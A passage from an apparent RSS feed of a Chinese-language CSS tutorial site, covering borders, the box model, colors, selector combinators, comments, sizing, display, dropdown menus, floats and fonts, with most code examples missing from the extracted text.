<p>可以将宽度设置为特定大小（以 <code>px</code>、<code>pt</code>、<code>cm</code>、<code>em</code>），也可以使用以下三个预定义值之一：<code>thin</code>、<code>medium</code> 或 <code>thick</code>。例如：</p>

<h3> 特定边的宽度</h3>
<p><code>border-width</code> 属性可以设置一到四个值（用于上边框、右边框、下边框和左边框）。例如：</p>

<h2> CSS 边框颜色</h2>
<p><code>border-color</code> 属性用于设置四个边框的颜色。</p>
<p>可以通过以下方式设置颜色：</p>
<ul>
<li><strong>name</strong>：指定颜色名。比如：<code>red</code></li>
<li><strong>HEX</strong>：指定十六进制值。比如：<code>#ff0000</code></li>
<li><strong>RGB</strong>：指定 RGB 值。比如：<code>rgb(255,0,0)</code></li>
<li><strong>HSL</strong>：指定 HSL 值。比如：<code>hsl(0, 100%, 50%)</code></li>
<li><strong>transparent</strong>：透明度</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果未设置 <code>border-color</code>，则它将继承元素的颜色</p>
</div>
<p>例如：</p>

<h3> 特定边框的颜色</h3>
<p><code>border-color</code> 属性可以设置一到四个值（用于上边框、右边框、下边框和左边框）。例如：</p>

<h3> HEX 值</h3>
<p>边框的颜色也可以使用十六进制值（HEX）来指定。例如：</p>

<h3> RGB 值</h3>
<p>或者使用 RGB 值。例如：</p>

<h3> HSL 值</h3>
<p>也可以使用 HSL 值。例如：</p>

<h2> CSS 边框各边</h2>
<p>在 CSS 中，还有一些属性可用于指定每个边框（上、右、下和左边框）的类型。例如：</p>

<ul>
<li><strong>border-top-style</strong>：上边框类型</li>
<li><strong>border-right-style</strong>：右边框类型</li>
<li><strong>border-bottom-style</strong>：下边框类型</li>
<li><strong>border-left-style</strong>：左边框类型</li>
</ul>
<h3> 简写边框各边样式</h3>
<p>使用 <code>border-style</code> 属性设置四个值（用于上边框、右边框、下边框和左边框）。例如：</p>

<ul>
<li><code>border-style</code> 属性设置四个值：<code>border-style: dotted solid double dashed;</code> 为上边框点线、右边框实线、下边框双线、左边框虚线</li>
<li><code>border-style</code> 属性设置三个值：<code>border-style: dotted solid double;</code> 为上边框点线、右和左边框实线、下边框双线</li>
<li><code>border-style</code> 属性设置两个值：<code>border-style: dotted solid;</code> 为上和下边框点线、右和左边框实线</li>
<li><code>border-style</code> 属性设置一个值：<code>border-style: dotted;</code> 四条边均为点线</li>
</ul>
<h2> 简写边框属性</h2>
<p>为了缩减代码，也可以在一个属性中指定所有单独的边框属性。</p>
<p><code>border</code> 属性是以下各个边框属性的简写属性：</p>
<ul>
<li><code>border-width</code></li>
<li><code>border-style</code>（必需）</li>
<li><code>border-color</code></li>
</ul>
<p>例如：</p>

<p>您还可以只为一个边指定所有单个边框属性。</p>
<p>例如：左边框。</p>

<ul>
<li><strong>border-top</strong>：简写属性把上边框的所有属性设置到一个声明中</li>
<li><strong>border-right</strong>：简写属性把右边框的所有属性设置到一个声明中</li>
<li><strong>border-bottom</strong>：简写属性把下边框的所有属性设置到一个声明中</li>
<li><strong>border-left</strong>：简写属性把左边框的所有属性设置到一个声明中</li>
</ul>
<h2> 圆角边框</h2>
<p><code>border-radius</code> 属性用于向元素添加圆角边框。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>框模型</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/boxmodel.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/boxmodel.html</guid>
      <source url="https://sankgao.github.io/rss.xml">框模型</source>
      <description>所有 HTML 元素都可以视为方框。在 CSS 中，在谈论设计和布局时，会使用术语 “盒模型” 或 “框模型”。 CSS 框模型实质上是一个包围每个 HTML 元素的框。它包括：外边距、边框、内边距以及实际的内容。框模型如下所示： text（内容）：框的内容，其中显示文本和图像; padding（内边距）：清除内容周围的区域。内边距是透明的; bord...</description>
      <category>Frontend</category>
      <pubDate>Tue, 16 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>所有 HTML 元素都可以视为方框。在 CSS 中，在谈论设计和布局时，会使用术语 “盒模型” 或 “框模型”。</p>
<p>CSS 框模型实质上是一个包围每个 HTML 元素的框。它包括：外边距、边框、内边距以及实际的内容。框模型如下所示：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>text（内容）</strong>：框的内容，其中显示文本和图像</li>
<li><strong>padding（内边距）</strong>：清除内容周围的区域。内边距是透明的</li>
<li><strong>border（边框）</strong>：围绕内边距和内容的边框</li>
<li><strong>margin（外边距）</strong>：清除边界外的区域。外边距是透明的</li>
<li><strong>heigh（高度）</strong>：内容区域的高度</li>
<li><strong>width（宽度）</strong>：内容区域的宽度</li>
</ul>
<p>框模型允许在元素周围添加边框，并定义元素之间的空间。</p>
<p>元素框的 <strong>最内部分是实际的内容</strong>，直接包围内容的是内边距。内边距呈现了元素的背景。内边距的边缘是边框。边框以外是外边距，外边距默认是透明的，因此不会遮挡其后的任何元素。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>背景应用于由内容和内边距、边框组成的区域</p>
</div>
<p>内边距、边框和外边距都是可选的，默认值是零。但是，许多元素将由用户代理样式表设置外边距和内边距。可以通过将元素的 <code>margin</code> 和 <code>padding</code> 设置为零来覆盖这些浏览器样式。这可以分别进行，也可以使用通用选择器对所有元素进行设置。例如：</p>
<div class="language-css line-numbers-mode" data-ext="css"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在 CSS 中，<code>width</code> 和 <code>height</code> 指的是内容区域的宽度和高度。增加内边距、边框和外边距不会影响内容区域的尺寸，但是会增加元素框的总尺寸。</p>
<p>假设框的每个边上有 10 个像素的外边距和 5 个像素的内边距。如果希望这个元素框达到 100 个像素，就需要将内容的宽度设置为 70 像素。如下所示：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-css line-numbers-mode" data-ext="css"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>内边距、边框和外边距可以应用于一个元素的所有边，也可以应用于单独的边</p>
<p>外边距可以是负值，而且在很多情况下都要使用负值的外边距</p>
<p>内边距不可以是负值</p>
</div>
<p>例如：演示框模型。</p>

<h2> 元素的宽度和高度</h2>
<p>为了在所有浏览器中正确设置元素的宽度和高度，您需要了解框模型如何工作。</p>
<div class="hint-container warning">
<p class="hint-container-title">注意</p>
<p>使用 CSS 设置元素的 <code>width</code> 和 <code>height</code> 属性时，只需设置内容区域的宽度和高度。要计算元素的完整大小，还必须把内边距、边框和外边距加起来</p>
</div>
<p>例如：<code>&lt;div&gt;</code> 元素的总宽度将是 <code>350px</code>。</p>

<p><strong>计算如下：</strong></p>
<ul>
<li><strong>元素总宽度</strong> = 320px（宽度） + 10px（左内边距） + 10px（右内边距） + 5px（左边框） + 5px（右边框） + 0px（左外边距） + 0px（右外边距）</li>
<li><strong>元素总高度</strong> = 高度 + 上内边距 + 下内边距 + 上边框 + 下边框 + 上外边距 + 下外边距</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>颜色</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/colors.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/colors.html</guid>
      <source url="https://sankgao.github.io/rss.xml">颜色</source>
      <description>指定颜色是通过使用预定义的颜色名称或 RGB、`HEX、HSL、RGBA、HSLA 值。 CSS 颜色名 在 CSS 中，可以使用 颜色名称 来指定颜色 CSS/HTML 支持 140 种标准颜色名。例如： 演示 CSS 背景色 通过 background-color 属性您可以为 HTML 元素设置背景色。例如： 演示 CSS 文本颜色 通过 col...</description>
      <category>Frontend</category>
      <pubDate>Mon, 15 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>指定颜色是通过使用预定义的颜色名称或 <code>RGB</code>、<code>HEX</code>、<code>HSL</code>、<code>RGBA</code>、<code>HSLA</code> 值。</p>
<h2> CSS 颜色名</h2>
<p>在 CSS 中，可以使用 <strong>颜色名称</strong> 来指定颜色</p>
<p><code>CSS/HTML</code> 支持 <code>140</code> 种标准颜色名。例如：</p>

<h2> CSS 背景色</h2>
<p>通过 <code>background-color</code> 属性您可以为 HTML 元素设置背景色。例如：</p>

<h2> CSS 文本颜色</h2>
<p>通过 <code>color</code> 属性您可以设置文本的颜色。例如：</p>

<h2> CSS 边框颜色</h2>
<p>通过 <code>border</code> 属性您可以设置边框的颜色。例如：</p>

<ul>
<li><strong>border</strong>：属性三个值分别是 <strong>边框宽度</strong>、<strong>边框类型</strong>、<strong>边框颜色</strong></li>
</ul>
<h2> CSS RGB 颜色</h2>
<p>在 CSS 中，可以使用公式将颜色指定为 RGB 值。格式：<code>rgb(red, green, blue)</code></p>
<p>每个参数（<code>red</code>、<code>green</code> 以及 <code>blue</code>）定义了 <code>0</code> 到 <code>255</code> 之间的颜色强度。</p>
<p>例如：<code>rgb(255, 0, 0)</code> 显示为红色，因为红色设置为最大值（<code>255</code>），其他设置为 <code>0</code>。</p>
<p>要显示黑色，请将所有颜色参数设置为 <code>0</code>。例如：<code>rgb(0, 0, 0)</code>。</p>
<p>要显示白色，请将所有颜色参数设置为 <code>255</code>。例如：<code>rgb(255, 255, 255)</code>。</p>

<h3> RGBA 值</h3>
<p><code>RGBA</code> 颜色值是具有 <code>alpha</code> 通道的 <code>RGB</code> 颜色值的扩展，它指定了颜色的 <strong>不透明度。</strong></p>
<p>RGBA 颜色值指定为：<code>rgba(red, green, blue, alpha)</code></p>
<p><code>alpha</code> 参数是介于 <code>0.0</code>（完全透明）和 <code>1.0</code>（完全不透明）之间的数字。例如：</p>

<h2> CSS HEX 颜色</h2>
<p>在 CSS 中，可以使用十六进制值的格式指定颜色。格式：<code>#rrggbb</code></p>
<p>其中 <code>rr</code>（红色）、<code>gg</code>（绿色）和 <code>bb</code>（蓝色）是介于 <code>00</code> 和 <code>ff</code> 之间的 <strong>十六进制值</strong>（与十进制 <code>0-255</code> 相同）。</p>
<p>例如：<code>#ff0000</code> 显示为红色，因为红色设置为最大值（<code>ff</code>），其他设置为最小值（<code>00</code>）。</p>

<h2> CSS HSL 颜色</h2>
<p>在 CSS 中，可以使用色相、饱和度和明度（<code>HSL</code>）来指定颜色。格式：<code>hsla(hue, saturation, lightness)</code></p>
<p>色相（<code>hue</code>）是色轮上从 <code>0</code> 到 <code>360</code> 的度数。<code>0</code> 是红色，<code>120</code> 是绿色，<code>240</code> 是蓝色。</p>
<p>饱和度（<code>saturation</code>）是一个百分比值，<code>0%</code> 表示灰色阴影，而 <code>100%</code> 是全色。</p>
<p>亮度（<code>lightness</code>）也是百分比，<code>0%</code> 是黑色，<code>50%</code> 是既不明也不暗，<code>100%</code> 是白色。</p>
<h3> 饱和度</h3>
<p>饱和度可以描述为颜色的强度。</p>
<ul>
<li><strong>100%</strong>：是纯色，没有灰色阴影</li>
<li><strong>50%</strong>：是 <code>50%</code> 灰色，但是您仍然可以看到颜色</li>
<li><strong>0%</strong>：是完全灰色，您无法再看到颜色</li>
</ul>
<p>例如：</p>

<h2> 亮度</h2>
<p>颜色的明暗度可以描述为要赋予颜色多少光。</p>
<ul>
<li><strong>0%</strong>：表示不亮（黑色）</li>
<li><strong>50%</strong>：表示 <code>50%</code> 亮（既不暗也不亮）</li>
<li><strong>100%</strong>：表示全明（白）</li>
</ul>
<p>例如：</p>

<h3> HSLA 值</h3>
<p><code>HSLA</code> 颜色值是带有 <code>Alpha</code> 通道的 <code>HSL</code> 颜色值的扩展，它指定了颜色的不透明度。</p>
<p><code>HSLA</code> 颜色值指定为：<code>hsla(hue, saturation, lightness, alpha)</code></p>
<p><code>alpha</code> 参数是介于 <code>0.0</code>（完全透明）和 <code>1.0</code>（完全不透明）之间的数字。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>组合器</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/combinators.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/combinators.html</guid>
      <source url="https://sankgao.github.io/rss.xml">组合器</source>
      <description>组合器是解释选择器之间关系的某种机制。 CSS 选择器可以包含多个简单选择器。在简单选择器之间可以包含一个组合器。 CSS 中有四种不同的组合器： 后代选择器：空格; 子选择器：&amp;gt;; 相邻兄弟选择器：+; 通用兄弟选择器：~; 后代选择器 后代选择器匹配属于指定元素后代的所有元素。 例如：选择 元素内的所有 元素。 演示 子选择器 子选择器匹配属于指定...</description>
      <category>Frontend</category>
      <pubDate>Thu, 18 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>组合器是解释选择器之间关系的某种机制。</p>
<p>CSS 选择器可以包含多个简单选择器。在简单选择器之间可以包含一个组合器。</p>
<p>CSS 中有四种不同的组合器：</p>
<ul>
<li><strong>后代选择器</strong>：<code>空格</code></li>
<li><strong>子选择器</strong>：<code>&gt;</code></li>
<li><strong>相邻兄弟选择器</strong>：<code>+</code></li>
<li><strong>通用兄弟选择器</strong>：<code>~</code></li>
</ul>
<h2> 后代选择器</h2>
<p>后代选择器匹配属于指定元素后代的所有元素。</p>
<p>例如：选择 <code>&lt;div&gt;</code> 元素内的所有 <code>&lt;p&gt;</code> 元素。</p>

<h2> 子选择器</h2>
<p>子选择器匹配属于指定元素子元素的所有元素。</p>
<p>例如：选择属于 <code>&lt;div&gt;</code> 元素子元素的所有 <code>&lt;p&gt;</code> 元素。</p>

<h2> 相邻兄弟选择器</h2>
<p>相邻兄弟选择器匹配所有作为指定元素的相邻同级的元素。</p>
<p>兄弟（同级）元素必须具有相同的父元素，“相邻” 的意思是 “紧随其后”。</p>
<p>例如：选择紧随 <code>&lt;div&gt;</code> 元素之后的所有 <code>&lt;p&gt;</code> 元素。</p>

<h2> 通用兄弟选择器</h2>
<p>通用兄弟选择器匹配属于指定元素的同级元素的所有元素。</p>
<p>例如：选择属于 <code>&lt;div&gt;</code> 元素的同级元素的所有 <code>&lt;p&gt;</code> 元素。</p>

]]></content:encoded>
    </item>
    <item>
      <title>注释</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/comments.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/comments.html</guid>
      <source url="https://sankgao.github.io/rss.xml">注释</source>
      <description>注释用于解释代码，以后在您编辑源代码时可能会有所帮助。 可以在代码中的任何位置添加注释; 注释能横跨多行; 浏览器会忽略注释; 位于 元素内的 CSS 注释，以 / 开始，以 / 结束。例如： 演示 实例 在代码中的任何位置添加注释; 演示 注释能横跨多行; ::: normal-demo 演示 :::</description>
      <category>Frontend</category>
      <pubDate>Mon, 15 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>注释用于解释代码，以后在您编辑源代码时可能会有所帮助。</p>
<ul>
<li>可以在代码中的任何位置添加注释</li>
<li>注释能横跨多行</li>
<li>浏览器会忽略注释</li>
</ul>
<p>位于 <code>&lt;style&gt;</code> 元素内的 CSS 注释，以 <code>/*</code> 开始，以 <code>*/</code> 结束。例如：</p>

<h2> 实例</h2>
<ul>
<li>
<p>在代码中的任何位置添加注释</p>

</li>
<li>
<p>注释能横跨多行</p>

</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>高度和宽度</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/dimension.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/dimension.html</guid>
      <source url="https://sankgao.github.io/rss.xml">高度和宽度</source>
      <description>height 和 width 属性用于设置元素的高度和宽度。 height 和 width 属性不包括内边距、边框或外边距。它设置的是元素内边距、边框以及外边距内的区域的高度或宽度。例如： 演示 CSS 高度和宽度值 height 和 width 属性可设置如下值： auto：浏览器计算高度和宽度。默认; length：以 px、`cm 等定义高度或宽...</description>
      <category>Frontend</category>
      <pubDate>Tue, 16 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p><code>height</code> 和 <code>width</code> 属性用于设置元素的高度和宽度。</p>
<p><code>height</code> 和 <code>width</code> 属性不包括内边距、边框或外边距。它设置的是元素内边距、边框以及外边距内的区域的高度或宽度。例如：</p>

<h2> CSS 高度和宽度值</h2>
<p><code>height</code> 和 <code>width</code> 属性可设置如下值：</p>
<ul>
<li><strong>auto</strong>：浏览器计算高度和宽度。默认</li>
<li><strong>length</strong>：以 <code>px</code>、<code>cm</code> 等定义高度或宽度</li>
<li><strong>%</strong>：以包含块的百分比定义高度或宽度</li>
<li><strong>initial</strong>：将高度或宽度设置为默认值</li>
<li><strong>inherit</strong>：从其父值继承高度或宽度</li>
</ul>
<h2> 设置 max-width</h2>
<p><code>max-width</code> 属性用于设置元素的最大宽度。</p>
<p>可以用长度值（例如：<code>px</code>、<code>cm</code> 等）或包含块的百分比（<code>％</code>）来指定 <code>max-width</code>（最大宽度），也可以将其设置为 <code>none</code>（默认值。意味着没有最大宽度）。</p>
<p>当浏览器窗口小于元素的宽度（500px）时，会发生之前那个 <code>&lt;div&gt;</code> 的问题。然后，浏览器会将水平滚动条添加到页面。</p>
<p>在这种情况下，使用 <code>max-width</code> 能够改善浏览器对小窗口的处理。</p>
<p>将浏览器窗口拖动到小于 500px 的宽度，以查看两个 <code>div</code> 之间的区别。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>max-width</code> 属性的值将覆盖 <code>width</code>（宽度）</p>
</div>
<h2> 设置 CSS 尺寸属性</h2>
<ul>
<li><strong>height</strong>：设置元素的高度</li>
<li><strong>max-height</strong>：设置元素的最大高度</li>
<li><strong>min-height</strong>：设置元素的最小高度</li>
<li><strong>width</strong>：设置元素的宽度</li>
<li><strong>max-width</strong>：设置元素的最大宽度</li>
<li><strong>min-width</strong>：设置元素的最小宽度</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Display</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/display_visibility.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/display_visibility.html</guid>
      <source url="https://sankgao.github.io/rss.xml">Display</source>
      <description>display：指定应如何显示元素; visibility：指定元素是否应该可见; 每个 HTML 元素都有一个默认的 display 值，具体取决于它的元素类型。大多数元素的默认 display 值为 block 或 inline。 块级元素（block element） 块级元素总是从新行开始，并占据可用的全部宽度（尽可能向左和向右伸展）。例如： ...</description>
      <category>Frontend</category>
      <pubDate>Wed, 17 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<ul>
<li><strong>display</strong>：指定应如何显示元素</li>
<li><strong>visibility</strong>：指定元素是否应该可见</li>
</ul>
<p>每个 HTML 元素都有一个默认的 <code>display</code> 值，具体取决于它的元素类型。大多数元素的默认 <code>display</code> 值为 <code>block</code> 或 <code>inline</code>。</p>
<h2> 块级元素（block element）</h2>
<p>块级元素总是从新行开始，并占据可用的全部宽度（尽可能向左和向右伸展）。例如：</p>

<p>块级元素的一些例子：</p>
<ul>
<li><strong>&lt;div&gt;</strong></li>
<li><strong>&lt;h1&gt; - &lt;h6&gt;</strong></li>
<li><strong>&lt;p&gt;</strong></li>
<li><strong>&lt;form&gt;</strong></li>
<li><strong>&lt;header&gt;</strong></li>
<li><strong>&lt;footer&gt;</strong></li>
<li><strong>&lt;section&gt;</strong></li>
</ul>
<h2> 行内元素（inline element）</h2>
<p>内联元素不从新行开始，仅占用所需的宽度。例如：</p>

<p>行内元素的一些例子：</p>
<ul>
<li><strong>&lt;span&gt;</strong></li>
<li><strong>&lt;a&gt;</strong></li>
<li><strong>&lt;img&gt;</strong></li>
</ul>
<h2> Display</h2>
<p><code>display: none;</code> 通常与 JavaScript 一起使用，以隐藏和显示元素，而无需删除和重新创建它们。</p>
<p>默认情况下，<code>&lt;script&gt;</code> 元素使用 <code>display: none;</code>。</p>
<h2> 覆盖默认的 Display 值</h2>
<p>如前所述，每个元素都有一个默认 <code>display</code> 值。但是，您可以覆盖它。</p>
<p>将行内元素更改为块元素，反之亦然，对于使页面以特定方式显示同时仍遵循 Web 标准很有用。</p>
<p>例如：为实现水平导航栏菜单而生成行内的 <code>&lt;li&gt;</code> 元素。</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>设置元素的 <code>display</code> 属性仅会更改元素的显示方式，而不会更改元素的种类。因此，带有 <code>display: block;</code> 的行内元素不允许在其中包含其他块元素</p>
</div>
<p>例如：将 <code>&lt;span&gt;</code> 元素显示为块元素。</p>

<p>例如：下例将 <code>&lt;a&gt;</code> 元素显示为块元素。</p>

<h2> 隐藏元素</h2>
<p>通过将 <code>display</code> 属性设置为 <code>none</code> 可以隐藏元素。该元素将被隐藏，并且页面将显示为好像该元素不在其中，不会占用任何空间。例如：</p>

<p><code>visibility: hidden;</code> 也可以隐藏元素。但是，该元素仍将占用与之前相同的空间。元素将被隐藏，但仍会影响布局。例如：</p>

<h2> 布局实例</h2>
<ul>
<li><code>display: none;</code> 与 <code>visibility: hidden;</code> 之间的差异。例如：</li>
</ul>

<ul>
<li>结合使用 CSS 和 JavaScript 来显示内容。例如：</li>
</ul>

]]></content:encoded>
    </item>
    <item>
      <title>下拉菜单</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/dropdowns.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/dropdowns.html</guid>
      <source url="https://sankgao.github.io/rss.xml">下拉菜单</source>
      <description>使用 CSS 创建可悬停的下拉列表。 基础的下拉菜单 创建当用户将鼠标移到元素上时出现的下拉框。例如： 演示 使用任何元素打开下拉菜单内容。例如： 或 元素。 使用容器元素（如：）创建下拉内容，并在其中添加任何内容。 用 元素包围这些元素，使用 CSS 正确定位下拉内容。 .dropdown 类使用 position:relative，当我们希望将下拉...</description>
      <category>Frontend</category>
      <pubDate>Fri, 19 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>使用 CSS 创建可悬停的下拉列表。</p>
<h2> 基础的下拉菜单</h2>
<p>创建当用户将鼠标移到元素上时出现的下拉框。例如：</p>

<p>使用任何元素打开下拉菜单内容。例如：<code>&lt;span&gt;</code> 或 <code>&lt;button&gt;</code> 元素。</p>
<p>使用容器元素（如：<code>&lt;div&gt;</code>）创建下拉内容，并在其中添加任何内容。</p>
<p>用 <code>&lt;div&gt;</code> 元素包围这些元素，使用 CSS 正确定位下拉内容。</p>
<p><code>.dropdown</code> 类使用 <code>position:relative</code>，当我们希望将下拉内容放置在下拉按钮的正下方（使用 <code>position:absolute</code>）时，需要使用该类。</p>
<p><code>.dropdown-content</code> 类保存实际的下拉菜单内容。默认情况下它是隐藏的，并将在悬停时显示。请注意，<code>min-width</code> 设置为 <code>160px</code>。可随时更改此设置。如果您希望下拉内容的宽度与下拉按钮的宽度一样，请将宽度设置为 <code>100%</code>（设置 <code>overflow: auto</code> 可实现在小屏幕上滚动）。</p>
<p>我们用了 CSS <code>box-shadow</code> 属性，而不是边框，这样下拉菜单看起来像一张 “卡片”。</p>
<p>当用户将鼠标移到下拉按钮上时，<code>:hover</code> 选择器用于显示下拉菜单。</p>
<h2> 下拉式菜单</h2>
<p>创建一个下拉菜单，并允许用户从列表中选择一个选项。例如：</p>

]]></content:encoded>
    </item>
    <item>
      <title>浮动和清除</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/float.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/float.html</guid>
      <source url="https://sankgao.github.io/rss.xml">浮动和清除</source>
      <description>float：属性规定元素如何浮动; clear：属性规定哪些元素可以在清除的元素旁边以及在哪一侧浮动; float 属性 float 属性用于定位和格式化内容。例如：让图像向左浮动到容器中的文本那里。 float 属性可以设置以下值之一： left：元素浮动到其容器的左侧; right：元素浮动在其容器的右侧; none：元素不会浮动（将显示在文本中刚...</description>
      <category>Frontend</category>
      <pubDate>Wed, 17 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<ul>
<li><strong>float</strong>：属性规定元素如何浮动</li>
<li><strong>clear</strong>：属性规定哪些元素可以在清除的元素旁边以及在哪一侧浮动</li>
</ul>
<h2> float 属性</h2>
<p><code>float</code> 属性用于定位和格式化内容。例如：让图像向左浮动到容器中的文本那里。</p>
<p><code>float</code> 属性可以设置以下值之一：</p>
<ul>
<li><strong>left</strong>：元素浮动到其容器的左侧</li>
<li><strong>right</strong>：元素浮动在其容器的右侧</li>
<li><strong>none</strong>：元素不会浮动（将显示在文本中刚出现的位置）。默认值</li>
<li><strong>inherit</strong>：元素继承其父级的 <code>float</code> 值</li>
</ul>
<p>最简单的用法是，实现（报纸上）文字包围图片的效果。</p>
<h3> float: right;</h3>
<p>指定图像应在文本中向右浮动。例如：</p>

<h3> float: left;</h3>
<p>指定图像应在文本中向左浮动。例如：</p>

<h3> float: none;</h3>
<p>图像将显示在文本中刚出现的位置。例如：</p>

<h2> clear 属性</h2>
<p><code>clear</code> 属性规定元素的哪一侧不允许其他浮动元素。</p>
<ul>
<li><strong>left</strong>：在左侧不允许浮动元素</li>
<li><strong>right</strong>：在右侧不允许浮动元素</li>
<li><strong>both</strong>：在左右两侧均不允许浮动元素</li>
<li><strong>none</strong>：允许浮动元素出现在两侧。默认值</li>
<li><strong>inherit</strong>：元素继承其父级的 <code>clear</code> 值</li>
</ul>
<p>使用 <code>clear</code> 属性的最常见用法是在元素上使用了 <code>float</code> 属性之后。</p>
<p>在清除浮动时，应该对清除与浮动进行匹配：如果某个元素浮动到左侧，则应清除左侧。您的浮动元素会继续浮动，但是被清除的元素将显示在其下方。</p>
<p>例如：将清除向左的浮动。表示在（div 的）左侧不允许出现浮动元素。</p>

<h3> clearfix Hack</h3>
<p>如果一个元素比包含它的元素高，并且它是浮动的，它将 “溢出” 到其容器之外。</p>
<p>向包含元素添加 <code>overflow: auto;</code>，来解决此问题。例如：</p>

<p>只要您能够控制外边距和内边距（否则您可能会看到滚动条），<code>overflow: auto</code> clearfix 就会很好地工作。</p>
<p>但是，新的现代 clearfix hack 技术使用起来更安全，被应用于多数网站。例如：</p>

<ul>
<li><strong>::after</strong>：伪元素可用于在元素内容之后插入一些内容</li>
<li><strong>content</strong>：属性用于定义元素之前或之后放置的生成内容</li>
<li><strong>display</strong>：属性规定元素应该生成的框的类型。<code>table</code> 此元素会作为块级表格来显示（类似 <code>&lt;table&gt;</code>），表格前后带有换行符</li>
</ul>
<h2> 浮动实例</h2>
<ul>
<li>
<p>网格或等宽的框。例如：</p>

</li>
<li>
<p>box-sizing</p>
<p>您可以轻松地并排创建三个浮动框。但是，当您添加一些内容来扩大每个框的宽度（例如上个例子：内边距或边框）时，这个框会损坏。<code>box-sizing</code> 属性允许在框的总宽度（和高度）中包括内边距和边框，确保内边距留在框内而不会破裂。例如：</p>

<ul>
<li><strong>box-sizing</strong>：属性允许您以特定的方式定义匹配某个区域的特定元素。<code>border-box</code> 值为元素设定的宽度和高度决定了元素的边框盒</li>
</ul>
</li>
<li>
<p>等宽的框</p>
<p>在上例中，以相等的宽度并排浮动框。但是，创建具有相同高度的浮动框并不容易。不过，快速解决方案是设置一个固定的高度。例如：</p>

<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>但是，这么做就失去了弹性。如果可以保证框中始终有相同数量的内容，那是可以的。但是很多时候，内容是不一样的。如果您在手机上尝试上例，则会看到第二个框的内容将显示在框的外部</p>
</div>
</li>
<li>
<p>Flexbox</p>
<p>自动拉伸框使其与最长的框一样长。例如：</p>

<ul>
<li><strong>flex-wrap</strong>：属性规定弹性项目是否应换行</li>
</ul>
</li>
<li>
<p>导航菜单</p>
<p>将 <code>float</code> 与超链接列表一起使用，来创建水平菜单。例如：</p>

</li>
<li>
<p>Web 布局实例</p>
<p>使用 <code>float</code> 属性完成整个 Web 布局也很常见。例如：</p>

</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>字体</title>
      <link>https://sankgao.github.io/languages/css3/tutorial/font.html</link>
      <guid>https://sankgao.github.io/languages/css3/tutorial/font.html</guid>
      <source url="https://sankgao.github.io/rss.xml">字体</source>
      <description>字体选择很重要 使用易于阅读的字体很重要。字体为您的文本增加了价值。为字体选择正确的颜色和文本大小也很重要。 通用字体族 在 CSS 中，有五个通用字体族： 衬线字体（Serif）：在每个字母的边缘都有一个小的笔触。它们营造出一种形式感和优雅感; 无衬线字体（Sans-serif）：字体线条简洁（没有小笔画）。它们营造出现代而简约的外观; 等宽字体（M...</description>
      <category>Frontend</category>
      <pubDate>Tue, 16 May 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 字体选择很重要</h2>
<p>使用易于阅读的字体很重要。字体为您的文本增加了价值。为字体选择正确的颜色和文本大小也很重要。</p>
<h3> 通用字体族</h3>
<p>在 CSS 中，有五个通用字体族：</p>
<ul>
<li><strong>衬线字体（Serif）</strong>：在每个字母的边缘都有一个小的笔触。它们营造出一种形式感和优雅感</li>
<li><strong>无衬线字体（Sans-serif）</strong>：字体线条简洁（没有小笔画）。它们营造出现代而简约的外观</li>
<li><strong>等宽字体（Monospace）</strong>：这里所有字母都有相同的固定宽度。它们创造出机械式的外观</li>
<li><strong>草书字体（Cursive）</strong>：模仿了人类的笔迹</li>
